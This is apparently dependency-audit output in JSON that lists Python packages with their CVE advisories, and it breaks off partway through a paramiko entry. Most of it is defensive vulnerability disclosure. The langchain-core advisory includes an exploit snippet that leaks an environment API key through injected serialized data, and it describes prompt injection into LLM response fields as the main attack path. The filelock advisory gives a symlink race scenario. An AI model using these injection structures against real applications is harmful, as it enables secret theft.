{"dependencies": [{"name": "aeidon", "version": "1.11", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.6.1", "vulns": []}, {"name": "aiohttp", "version": "3.13.2", "vulns": [{"id": "CVE-2025-69223", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6mq8-rvhq-8wgg"], "description": "### Summary A zip bomb can be used to execute a DoS against the aiohttp server.  ### Impact An attacker may be able to send a compressed request that when decompressed by aiohttp could exhaust the host's memory.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/2b920c39002cee0ec5b402581779bbaaf7c9138a"}, {"id": "CVE-2025-69224", "fix_versions": ["3.13.3"], "aliases": ["GHSA-69f9-5gxw-wvc2"], "description": "### Summary The Python HTTP parser may allow a request smuggling attack with the presence of non-ASCII characters.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/32677f2adfd907420c078dda6b79225c6f4ebce0"}, {"id": "CVE-2025-69228", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6jhg-hg63-jvvf"], "description": "### Summary A request can be crafted in such a way that an aiohttp server's memory fills up uncontrollably during processing.  ### Impact If an application includes a handler that uses the `Request.post()` method, an attacker may be able to freeze the server by exhausting the memory.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60"}, {"id": "CVE-2025-69229", "fix_versions": ["3.13.3"], "aliases": ["GHSA-g84x-mcqj-x9qq"], "description": "### Summary  Handling of chunked messages can result in excessive blocking CPU usage when receiving a large number of chunks.  ### Impact  If an application makes use of the `request.read()` method in an endpoint, it may be possible for an attacker to cause the server to spend a moderate amount of blocking CPU time (e.g. 1 second) while processing the request. This could potentially lead to DoS as the server would be unable to handle other requests during that time.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/dc3170b56904bdf814228fae70a5501a42a6c712 Patch: https://github.com/aio-libs/aiohttp/commit/4ed97a4e46eaf61bd0f05063245f613469700229"}, {"id": "CVE-2025-69230", "fix_versions": ["3.13.3"], "aliases": ["GHSA-fh55-r93g-j68g"], "description": "### Summary Reading multiple invalid cookies can lead to a logging storm.  ### Impact If the ``cookies`` attribute is accessed in an application, then an attacker may be able to trigger a storm of warning-level logs using a specially crafted Cookie header.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/64629a0834f94e46d9881f4e99c41a137e1f3326"}, {"id": "CVE-2025-69226", "fix_versions": ["3.13.3"], "aliases": ["GHSA-54jq-c3m8-4m76"], "description": "### Summary Path normalization for static files prevents path traversal, but opens up the ability for an attacker to ascertain the existence of absolute path components.  ### Impact If an application uses `web.static()` (not recommended for production deployments), it may be possible for an attacker to ascertain the existence of path components.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/f2a86fd5ac0383000d1715afddfa704413f0711e"}, {"id": "CVE-2025-69227", "fix_versions": ["3.13.3"], "aliases": ["GHSA-jj3x-wxrx-4x23"], "description": "### Summary When assert statements are bypassed, an infinite loop can occur, resulting in a DoS attack when processing a POST body.  ### Impact If optimisations are enabled (`-O` or `PYTHONOPTIMIZE=1`), and the application includes a handler that uses the `Request.post()` method, then an attacker may be able to execute a DoS attack with a specially crafted message.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/bc1319ec3cbff9438a758951a30907b072561259"}, {"id": "CVE-2025-69225", "fix_versions": ["3.13.3"], "aliases": ["GHSA-mqqc-3gqh-h2x8"], "description": "### Summary  The parser allows non-ASCII decimals to be present in the Range header.  ### Impact  There is no known impact, but there is the possibility that there's a method to exploit a request smuggling vulnerability.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/c7b7a044f88c71cefda95ec75cdcfaa4792b3b96"}]}, {"name": "aiohttp-jinja2", "version": "1.6", "vulns": []}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "annotated-doc", "version": "0.0.4", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "ansible", "version": "9.2.0", "vulns": [{"id": "CVE-2025-14010", "fix_versions": ["12.2.0"], "aliases": ["GHSA-8ggh-xwr9-3373"], "description": "A flaw was found in ansible-collection-community-general. This vulnerability allows for information exposure (IE) of sensitive credentials, specifically plaintext passwords, via verbose output when running Ansible with debug modes. Attackers with access to logs could retrieve these secrets and potentially compromise Keycloak accounts or administrative access."}]}, {"name": "ansible-core", "version": "2.16.3", "vulns": [{"id": "CVE-2024-9902", "fix_versions": ["2.14.18rc1", "2.15.13rc1", "2.16.13rc1", "2.17.6rc1", "2.18.0rc2"], "aliases": ["GHSA-32p4-gm2c-wmch"], "description": "A flaw was found in Ansible. The ansible-core `user` module can allow an unprivileged user to silently create or replace the contents of any file on any system path and take ownership of it when a privileged user executes the `user` module against the unprivileged user's home directory. If the unprivileged user has traversal permissions on the directory containing the exploited target file, they retain full control over the contents of the file as its owner."}, {"id": "CVE-2024-8775", "fix_versions": ["2.16.13", "2.17.6"], "aliases": ["GHSA-jpxc-vmjf-9fcj"], "description": "A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions."}, {"id": "CVE-2024-11079", "fix_versions": ["2.16.14rc1", "2.17.7rc1", "2.18.1rc1"], "aliases": ["GHSA-99w6-3xph-cx78"], "description": "A flaw was found in Ansible-Core. This vulnerability allows attackers to bypass unsafe content protections using the hostvars object to reference and execute templated content. This issue can lead to arbitrary code execution if remote data or module outputs are improperly templated within playbooks."}]}, {"name": "anyio", "version": "4.12.0", "vulns": []}, {"name": "apache-libcloud", "version": "3.4.1", "vulns": []}, {"name": "argcomplete", "version": "3.1.4", "vulns": []}, {"name": "asgiref", "version": "3.7.2", "vulns": []}, {"name": "attrs", "version": "25.4.0", "vulns": []}, {"name": "automat", "version": "22.10.0", "vulns": []}, {"name": "babel", "version": "2.10.3", "vulns": []}, {"name": "backoff", "version": "2.2.1", "vulns": []}, {"name": "bandit", "version": "1.9.2", "vulns": []}, {"name": "bcc", "skip_reason": "Dependency not found on PyPI and could not be audited: bcc (0.29.1)"}, {"name": "bcrypt", "version": "5.0.0", "vulns": []}, {"name": "beautifulsoup4", "version": "4.12.3", "vulns": []}, {"name": "blinker", "version": "1.7.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "brlapi", "skip_reason": "Dependency not found on PyPI and could not be audited: brlapi (0.8.5)"}, {"name": "brotli", "version": "1.1.0", "vulns": [{"id": "CVE-2025-6176", "fix_versions": ["1.2.0"], "aliases": ["GHSA-2qfp-q593-8484"], "description": "Scrapy versions up to 2.13.3 are vulnerable to a denial of service (DoS) attack due to a flaw in its brotli decompression implementation. The protection mechanism against decompression bombs fails to mitigate the brotli variant, allowing remote servers to crash clients with less than 80GB of available memory. This occurs because brotli can achieve extremely high compression ratios for zero-filled data, leading to excessive memory consumption during decompression. Mitigation for this vulnerability needs security enhancement added in brotli v1.2.0."}]}, {"name": "build", "version": "1.3.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.4", "vulns": []}, {"name": "cachetools", "version": "6.2.2", "vulns": []}, {"name": "cclib", "version": "1.8", "vulns": []}, {"name": "certifi", "version": "2025.11.12", "vulns": []}, {"name": "cffi", "version": "2.0.0", "vulns": []}, {"name": "chardet", "version": "5.2.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.4", "vulns": []}, {"name": "cheroot", "skip_reason": "Dependency not found on PyPI and could not be audited: cheroot (10.0.0+ds1)"}, {"name": "chromadb", "version": "1.3.5", "vulns": []}, {"name": "click", "version": "8.3.1", "vulns": []}, {"name": "cloud-init", "skip_reason": "Dependency not found on PyPI and could not be audited: cloud-init (25.2)"}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "coloredlogs", "version": "15.0.1", "vulns": []}, {"name": "command-not-found", "skip_reason": "Dependency not found on PyPI and could not be audited: command-not-found (0.3)"}, {"name": "configobj", "version": "5.0.8", "vulns": [{"id": "CVE-2023-26112", "fix_versions": ["5.0.9"], "aliases": ["GHSA-c33w-24p9-8m24"], "description": "All versions of the package configobj are vulnerable to Regular Expression Denial of Service (ReDoS) via the validate function, using (.+?)\\((.*)\\). **Note:** This is only exploitable in the case of a developer, putting the offending value in a server side configuration file."}]}, {"name": "constantly", "version": "23.10.4", "vulns": []}, {"name": "coverage", "version": "7.12.0", "vulns": []}, {"name": "cryptography", "version": "46.0.3", "vulns": []}, {"name": "cssselect", "version": "1.2.0", "vulns": []}, {"name": "cups-of-caffeine", "version": "2.9.12", "vulns": []}, {"name": "cupshelpers", "skip_reason": "Dependency not found on PyPI and could not be audited: cupshelpers (1.0)"}, {"name": "cyclonedx-python-lib", "version": "11.6.0", "vulns": []}, {"name": "dbus-python", "version": "1.3.2", "vulns": []}, {"name": "decorator", "version": "5.1.1", "vulns": []}, {"name": "defer", "skip_reason": "Dependency not found on PyPI and could not be audited: defer (1.0.6)"}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deptry", "version": "0.24.0", "vulns": []}, {"name": "diff-match-patch", "version": "20230430", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "distro-info", "skip_reason": "Dependency not found on PyPI and could not be audited: distro-info (1.7+build1)"}, {"name": "dnspython", "version": "2.6.1", "vulns": []}, {"name": "duplicity", "version": "2.1.4", "vulns": []}, {"name": "durationpy", "version": "0.10", "vulns": []}, {"name": "einops", "version": "0.8.1", "vulns": []}, {"name": "ewmh", "version": "0.1.6", "vulns": []}, {"name": "faker", "version": "39.0.0", "vulns": []}, {"name": "fastapi", "version": "0.121.3", "vulns": []}, {"name": "fasteners", "version": "0.18", "vulns": []}, {"name": "filelock", "version": "3.20.1", "vulns": [{"id": "CVE-2026-22701", "fix_versions": ["3.20.3"], "aliases": ["GHSA-qmgc-5h2g-mvrw"], "description": "## Vulnerability Summary  **Title:** Time-of-Check-Time-of-Use (TOCTOU) Symlink Vulnerability in SoftFileLock  **Affected Component:** `filelock` package - `SoftFileLock` class **File:** `src/filelock/_soft.py` lines 17-27 **CWE:** CWE-362, CWE-367, CWE-59  ---  ## Description  A TOCTOU race condition vulnerability exists in the `SoftFileLock` implementation of the filelock package. An attacker with local filesystem access and permission to create symlinks can exploit a race condition between the permission validation and file creation to cause lock operations to fail or behave unexpectedly.  The vulnerability occurs in the `_acquire()` method between `raise_on_not_writable_file()` (permission check) and `os.open()` (file creation). During this race window, an attacker can create a symlink at the lock file path, potentially causing the lock to operate on an unintended target file or leading to denial of service.  ### Attack Scenario  ``` 1. Lock attempts to acquire on /tmp/app.lock 2. Permission validation passes 3. [RACE WINDOW] - Attacker creates: ln -s /tmp/important.txt /tmp/app.lock 4. os.open() tries to create lock file 5. Lock operates on attacker-controlled target file or fails ```  ---  ## Impact  _What kind of vulnerability is it? Who is impacted?_  This is a **Time-of-Check-Time-of-Use (TOCTOU) race condition vulnerability** affecting any application using `SoftFileLock` for inter-process synchronization.  **Affected Users:** - Applications using `filelock.SoftFileLock` directly - Applications using the fallback `FileLock` on systems without `fcntl` support (e.g., GraalPy)  **Consequences:** - **Silent lock acquisition failure** - applications may not detect that exclusive resource access is not guaranteed - **Denial of Service** - attacker can prevent lock file creation by maintaining symlink - **Resource serialization failures** - multiple processes may acquire \"locks\" simultaneously - **Unintended file operations** - lock could operate on attacker-controlled files  **CVSS v4.0 Score:** 5.6 (Medium) **Vector:** CVSS:4.0/AV:L/AT:L/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N  **Attack Requirements:** - Local filesystem access to the directory containing lock files - Permission to create symlinks (standard for regular unprivileged users on Unix/Linux) - Ability to time the symlink creation during the narrow race window  ---  ## Patches  _Has the problem been patched? What versions should users upgrade to?_  Yes, the vulnerability has been patched by adding the `O_NOFOLLOW` flag to prevent symlink following during lock file creation.  **Patched Version:** Next release (commit: 255ed068bc85d1ef406e50a135e1459170dd1bf0)  **Mitigation Details:** - The `O_NOFOLLOW` flag is added conditionally and gracefully degrades on platforms without support - On platforms with `O_NOFOLLOW` support (most modern systems): symlink attacks are completely prevented - On platforms without `O_NOFOLLOW` (e.g., GraalPy): TOCTOU window remains but is documented  **Users should:** - Upgrade to the patched version when available - For critical deployments, consider using `UnixFileLock` or `WindowsFileLock` instead of the fallback `SoftFileLock`  ---  ## Workarounds  _Is there a way for users to fix or remediate the vulnerability without upgrading?_  For users unable to update immediately:  1. **Avoid `SoftFileLock` in security-sensitive contexts** - use `UnixFileLock` or `WindowsFileLock` when available (these were already patched for CVE-2025-68146)  2. **Restrict filesystem permissions** - prevent untrusted users from creating symlinks in lock file directories:    ```bash    chmod 700 /path/to/lock/directory    ```  3. **Use process isolation** - isolate untrusted code from lock file paths to prevent symlink creation  4. **Monitor lock operations** - implement application-level checks to verify lock acquisitions are successful before proceeding with critical operations  ---  ## References  _Are there any links users can visit to find out more?_  - **Similar Vulnerability:** CVE-2025-68146 (TOCTOU vulnerability in UnixFileLock/WindowsFileLock) - **CWE-362 (Concurrent Execution using Shared Resource):** https://cwe.mitre.org/data/definitions/362.html - **CWE-367 (Time-of-check Time-of-use Race Condition):** https://cwe.mitre.org/data/definitions/367.html - **CWE-59 (Improper Link Resolution Before File Access):** https://cwe.mitre.org/data/definitions/59.html - **O_NOFOLLOW documentation:** https://man7.org/linux/man-pages/man2/open.2.html - **GitHub Repository:** https://github.com/tox-dev/filelock  ---  **Reported by:** George Tsigourakos (@tsigouris007)"}]}, {"name": "flask", "version": "3.0.2", "vulns": []}, {"name": "flatbuffers", "version": "25.9.23", "vulns": []}, {"name": "frozenlist", "version": "1.8.0", "vulns": []}, {"name": "fsspec", "version": "2025.9.0", "vulns": []}, {"name": "fuse-python", "version": "1.0.7", "vulns": []}, {"name": "gitdb", "version": "4.0.12", "vulns": []}, {"name": "gitpython", "version": "3.1.45", "vulns": []}, {"name": "google-auth", "version": "2.43.0", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.72.0", "vulns": []}, {"name": "gpg", "skip_reason": "Dependency not found on PyPI and could not be audited: gpg (1.18.0)"}, {"name": "greenlet", "version": "3.0.3", "vulns": []}, {"name": "grpcio", "version": "1.76.0", "vulns": []}, {"name": "gyp", "version": "0.1", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "h2", "version": "4.1.0", "vulns": [{"id": "CVE-2025-57804", "fix_versions": ["4.3.0"], "aliases": ["GHSA-847f-9342-265h"], "description": "### Summary  HTTP/2 request splitting vulnerability allows attackers to perform request smuggling attacks by injecting CRLF characters into headers. This occurs when servers downgrade HTTP/2 requests to HTTP/1.1 without properly validating header names/values, enabling attackers to manipulate request boundaries and bypass security controls."}]}, {"name": "hf-xet", "version": "1.2.0", "vulns": []}, {"name": "hpack", "version": "4.0.0", "vulns": []}, {"name": "html5lib", "version": "1.1", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httplib2", "version": "0.20.4", "vulns": []}, {"name": "httptools", "version": "0.7.1", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "httpx-sse", "version": "0.4.3", "vulns": []}, {"name": "huggingface-hub", "version": "0.36.0", "vulns": []}, {"name": "humanfriendly", "version": "10.0", "vulns": []}, {"name": "humanize", "version": "4.14.0", "vulns": []}, {"name": "hyperframe", "version": "6.0.0", "vulns": []}, {"name": "hyperlink", "version": "21.0.0", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "importlib-metadata", "version": "8.7.0", "vulns": []}, {"name": "importlib-resources", "version": "6.5.2", "vulns": []}, {"name": "incremental", "version": "22.10.0", "vulns": []}, {"name": "iniconfig", "version": "2.3.0", "vulns": []}, {"name": "iniparse", "version": "0.5", "vulns": []}, {"name": "itsdangerous", "version": "2.1.2", "vulns": []}, {"name": "jaraco-functools", "version": "4.0.0", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.5.2", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpointer", "version": "3.0.0", "vulns": []}, {"name": "jsonschema", "version": "4.25.1", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.9.1", "vulns": []}, {"name": "kaitaistruct", "version": "0.10", "vulns": []}, {"name": "kubernetes", "version": "34.1.0", "vulns": []}, {"name": "langchain", "version": "1.0.8", "vulns": []}, {"name": "langchain-core", "version": "1.1.0", "vulns": [{"id": "CVE-2025-68664", "fix_versions": ["0.3.81", "1.2.5"], "aliases": ["GHSA-c67j-w6g6-q2cm"], "description": "## Summary  A serialization injection vulnerability exists in LangChain's `dumps()` and `dumpd()` functions. The functions do not escape dictionaries with `'lc'` keys when serializing free-form dictionaries. The `'lc'` key is used internally by LangChain to mark serialized objects. When user-controlled data contains this key structure, it is treated as a legitimate LangChain object during deserialization rather than plain user data.  ### Attack surface  The core vulnerability was in `dumps()` and `dumpd()`: these functions failed to escape user-controlled dictionaries containing `'lc'` keys. When this unescaped data was later deserialized via `load()` or `loads()`, the injected structures were treated as legitimate LangChain objects rather than plain user data.  This escaping bug enabled several attack vectors:  1. **Injection via user data**: Malicious LangChain object structures could be injected through user-controlled fields like `metadata`, `additional_kwargs`, or `response_metadata` 2. **Class instantiation within trusted namespaces**: Injected manifests could instantiate any `Serializable` subclass, but only within the pre-approved trusted namespaces (`langchain_core`, `langchain`, `langchain_community`). This includes classes with side effects in `__init__` (network calls, file operations, etc.). Note that namespace validation was already enforced before this patch, so arbitrary classes outside these trusted namespaces could not be instantiated.  ### Security hardening  This patch fixes the escaping bug in `dumps()` and `dumpd()` and introduces new restrictive defaults in `load()` and `loads()`: allowlist enforcement via `allowed_objects=\"core\"` (restricted to [serialization mappings](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py)), `secrets_from_env` changed from `True` to `False`, and default Jinja2 template blocking via `init_validator`. These are breaking changes for some use cases.  ## Who is affected?  Applications are vulnerable if they:  1. **Use `astream_events(version=\"v1\")`** \u2014 The v1 implementation internally uses vulnerable serialization. Note: `astream_events(version=\"v2\")` is not vulnerable. 2. **Use `Runnable.astream_log()`** \u2014 This method internally uses vulnerable serialization for streaming outputs. 3. **Call `dumps()` or `dumpd()` on untrusted data, then deserialize with `load()` or `loads()`** \u2014 Trusting your own serialization output makes you vulnerable if user-controlled data (e.g., from LLM responses, metadata fields, or user inputs) contains `'lc'` key structures. 4. **Deserialize untrusted data with `load()` or `loads()`** \u2014 Directly deserializing untrusted data that may contain injected `'lc'` structures. 5. **Use `RunnableWithMessageHistory`** \u2014 Internal serialization in message history handling. 6. **Use `InMemoryVectorStore.load()`** to deserialize untrusted documents. 7. Load untrusted generations from cache using **`langchain-community` caches**. 8. Load untrusted manifests from the LangChain Hub via **`hub.pull`**. 9. Use **`StringRunEvaluatorChain`** on untrusted runs. 10. Use **`create_lc_store`** or **`create_kv_docstore`** with untrusted documents. 11. Use **`MultiVectorRetriever`** with byte stores containing untrusted documents. 12. Use **`LangSmithRunChatLoader`** with runs containing untrusted messages.  The most common attack vector is through **LLM response fields** like `additional_kwargs` or `response_metadata`, which can be controlled via prompt injection and then serialized/deserialized in streaming operations.  ## Impact  Attackers who control serialized data can extract environment variable secrets by injecting `{\"lc\": 1, \"type\": \"secret\", \"id\": [\"ENV_VAR\"]}` to load environment variables during deserialization (when `secrets_from_env=True`, which was the old default). They can also instantiate classes with controlled parameters by injecting constructor structures to instantiate any class within trusted namespaces with attacker-controlled parameters, potentially triggering side effects such as network calls or file operations.  Key severity factors:  - Affects the serialization path - applications trusting their own serialization output are vulnerable - Enables secret extraction when combined with `secrets_from_env=True` (the old default) - LLM responses in `additional_kwargs` can be controlled via prompt injection  ## Exploit example  ```python from langchain_core.load import dumps, load import os  # Attacker injects secret structure into user-controlled data attacker_dict = {     \"user_data\": {         \"lc\": 1,         \"type\": \"secret\",         \"id\": [\"OPENAI_API_KEY\"]     } }  serialized = dumps(attacker_dict)  # Bug: does NOT escape the 'lc' key  os.environ[\"OPENAI_API_KEY\"] = \"sk-secret-key-12345\" deserialized = load(serialized, secrets_from_env=True)  print(deserialized[\"user_data\"])  # \"sk-secret-key-12345\" - SECRET LEAKED!  ```  ## Security hardening changes (breaking changes)  This patch introduces three breaking changes to `load()` and `loads()`:  1. **New `allowed_objects` parameter** (defaults to `'core'`): Enforces allowlist of classes that can be deserialized. The `'all'` option corresponds to the list of objects [specified in `mappings.py`](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py) while the `'core'` option limits to objects within `langchain_core`. We recommend that users explicitly specify which objects they want to allow for serialization/deserialization. 2. **`secrets_from_env` default changed from `True` to `False`**: Disables automatic secret loading from environment 3. **New `init_validator` parameter** (defaults to `default_init_validator`): Blocks Jinja2 templates by default  ## Migration guide  ### No changes needed for most users  If you're deserializing standard LangChain types (messages, documents, prompts, trusted partner integrations like `ChatOpenAI`, `ChatAnthropic`, etc.), your code will work without changes:  ```python from langchain_core.load import load  # Uses default allowlist from serialization mappings obj = load(serialized_data)  ```  ### For custom classes  If you're deserializing custom classes not in the serialization mappings, add them to the allowlist:  ```python from langchain_core.load import load from my_package import MyCustomClass  # Specify the classes you need obj = load(serialized_data, allowed_objects=[MyCustomClass]) ```  ### For Jinja2 templates  Jinja2 templates are now blocked by default because they can execute arbitrary code. If you need Jinja2 templates, pass `init_validator=None`:  ```python from langchain_core.load import load from langchain_core.prompts import PromptTemplate  obj = load(     serialized_data,     allowed_objects=[PromptTemplate],     init_validator=None )  ```  > [!WARNING] > Only disable `init_validator` if you trust the serialized data. Jinja2 templates can execute arbitrary Python code.  ### For secrets from environment  `secrets_from_env` now defaults to `False`. If you need to load secrets from environment variables:  ```python from langchain_core.load import load  obj = load(serialized_data, secrets_from_env=True) ```   ## Credits  * Dumps bug was reported by @yardenporat * Changes for security hardening due to findings from @0xn3va and @VladimirEliTokarev"}]}, {"name": "langgraph", "version": "1.0.3", "vulns": []}, {"name": "langgraph-checkpoint", "version": "3.0.1", "vulns": []}, {"name": "langgraph-prebuilt", "version": "1.0.5", "vulns": []}, {"name": "langgraph-sdk", "version": "0.2.9", "vulns": []}, {"name": "langsmith", "version": "0.4.46", "vulns": []}, {"name": "language-selector", "skip_reason": "Dependency not found on PyPI and could not be audited: language-selector (0.1)"}, {"name": "launchpadlib", "version": "1.11.0", "vulns": []}, {"name": "lazr-restfulclient", "version": "0.14.6", "vulns": []}, {"name": "lazr-uri", "version": "1.0.6", "vulns": []}, {"name": "ldap3", "version": "2.9.1", "vulns": []}, {"name": "levenshtein", "version": "0.25.1", "vulns": []}, {"name": "libcomps", "skip_reason": "Dependency not found on PyPI and could not be audited: libcomps (0.1.20)"}, {"name": "libvirt-python", "version": "10.0.0", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "linkify-it-py", "version": "2.0.3", "vulns": []}, {"name": "llmc", "skip_reason": "Dependency not found on PyPI and could not be audited: llmc (0.8.0)"}, {"name": "llmcwrapper", "skip_reason": "Dependency not found on PyPI and could not be audited: llmcwrapper (0.6.2)"}, {"name": "lockfile", "version": "0.12.2", "vulns": []}, {"name": "louis", "skip_reason": "Dependency not found on PyPI and could not be audited: louis (3.29.0)"}, {"name": "lxml", "version": "5.2.1", "vulns": []}, {"name": "mako", "skip_reason": "Dependency not found on PyPI and could not be audited: mako (1.3.2.dev0)"}, {"name": "markdown", "version": "3.5.2", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "markupsafe", "version": "2.1.5", "vulns": []}, {"name": "mcp", "version": "1.24.0", "vulns": []}, {"name": "mdit-py-plugins", "version": "0.5.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "meson", "version": "1.3.2", "vulns": []}, {"name": "mistletoe", "version": "1.3.0", "vulns": []}, {"name": "mistune", "version": "3.1.4", "vulns": []}, {"name": "mitmproxy", "version": "8.1.1", "vulns": [{"id": "CVE-2025-23217", "fix_versions": ["11.1.2"], "aliases": ["GHSA-wg33-5h85-7q5p"], "description": "### Impact In mitmweb 11.1.0 and below, a malicious client can use mitmweb's proxy server (bound to `*:8080` by default) to access mitmweb's internal API (bound to `127.0.0.1:8081` by default). In other words, while the client cannot access the API directly (good), they can access the API through the proxy (bad). An attacker may be able to escalate this [SSRF](https://en.wikipedia.org/wiki/Server-side_request_forgery)-style access to remote code execution.  The mitmproxy and mitmdump tools are unaffected. Only mitmweb is affected. The `block_global` option, which is enabled by default, blocks connections originating from publicly-routable IP addresses in the proxy. The attacker needs to be in the same local network.  ### Patches  The vulnerability has been fixed in mitmproxy 11.1.2 and above.  ### Acknowledgements  We thank Stefan Gr\u00f6nke (@gronke) for reporting this vulnerability as part of a security audit by [Radically Open Security](https://www.radicallyopensecurity.com/). This audit was supported by the [NGI0 Entrust fund](https://nlnet.nl/entrust/) established by [NLnet](https://nlnet.nl/).  ### Timeline  - **2025-01-14**: Received initial report.  - **2025-01-14**: Verified report and confirmed receipt. - **2025-01-19**: Shared patch with researcher. - **2025-02-04**: Received final confirmation that patch is working. - **2025-02-05**: Published patched release and advisory."}, {"id": "GHSA-63cx-g855-hvv4", "fix_versions": ["12.1.2"], "aliases": [], "description": "mitmproxy 12.1.1 and below embed python-hyper/h2 \u2264 v4.2.0, which has a gap in its HTTP/2 header validation. This enables request smuggling attacks when mitmproxy is in a configuration where it translates HTTP/2 to HTTP/1. For example, this affects reverse proxies to `http://` backends. It does not affect mitmproxy's regular mode.  All users are encouraged to upgrade to mitmproxy 12.1.2, which includes a fixed version of h2.  More details about the vulnerability itself can be found at https://github.com/python-hyper/h2/security/advisories/GHSA-847f-9342-265h."}]}, {"name": "mmh3", "version": "5.2.0", "vulns": []}, {"name": "monotonic", "version": "1.6", "vulns": []}, {"name": "more-itertools", "version": "10.2.0", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "multidict", "version": "6.7.0", "vulns": []}, {"name": "mypy", "version": "1.18.2", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "netaddr", "version": "0.8.0", "vulns": []}, {"name": "netifaces", "version": "0.11.0", "vulns": []}, {"name": "networkx", "version": "3.5", "vulns": []}, {"name": "ntlm-auth", "version": "1.5.0", "vulns": []}, {"name": "numpy", "version": "2.3.5", "vulns": []}, {"name": "nvidia-cublas-cu12", "version": "12.8.4.1", "vulns": []}, {"name": "nvidia-cuda-cupti-cu12", "version": "12.8.90", "vulns": []}, {"name": "nvidia-cuda-nvrtc-cu12", "version": "12.8.93", "vulns": []}, {"name": "nvidia-cuda-runtime-cu12", "version": "12.8.90", "vulns": []}, {"name": "nvidia-cudnn-cu12", "version": "9.10.2.21", "vulns": []}, {"name": "nvidia-cufft-cu12", "version": "11.3.3.83", "vulns": []}, {"name": "nvidia-cufile-cu12", "version": "1.13.1.3", "vulns": []}, {"name": "nvidia-curand-cu12", "version": "10.3.9.90", "vulns": []}, {"name": "nvidia-cusolver-cu12", "version": "11.7.3.90", "vulns": []}, {"name": "nvidia-cusparse-cu12", "version": "12.5.8.93", "vulns": []}, {"name": "nvidia-cusparselt-cu12", "version": "0.7.1", "vulns": []}, {"name": "nvidia-nccl-cu12", "version": "2.27.5", "vulns": []}, {"name": "nvidia-nvjitlink-cu12", "version": "12.8.93", "vulns": []}, {"name": "nvidia-nvshmem-cu12", "version": "3.3.20", "vulns": []}, {"name": "nvidia-nvtx-cu12", "version": "12.8.90", "vulns": []}, {"name": "oauthlib", "version": "3.3.1", "vulns": []}, {"name": "olefile", "version": "0.46", "vulns": []}, {"name": "onnxruntime", "version": "1.23.2", "vulns": []}, {"name": "opentelemetry-api", "version": "1.38.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-common", "version": "1.38.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-grpc", "version": "1.38.0", "vulns": []}, {"name": "opentelemetry-proto", "version": "1.38.0", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.38.0", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.59b0", "vulns": []}, {"name": "orjson", "version": "3.11.4", "vulns": []}, {"name": "ormsgpack", "version": "1.12.0", "vulns": []}, {"name": "overrides", "version": "7.7.0", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "paramiko", "version": "2.12.0", "vulns": [{"id": "CVE-2023-48795", "fix_versions": ["3.4.0"], "aliases": ["GHSA-45x7-px36-x8w8"], "description": "### Summary  Terrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.  ### Mitigations  To mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.  **Warning: To take effect, both the client and server must support this countermeasure.**   As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.  ### Details  The SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack 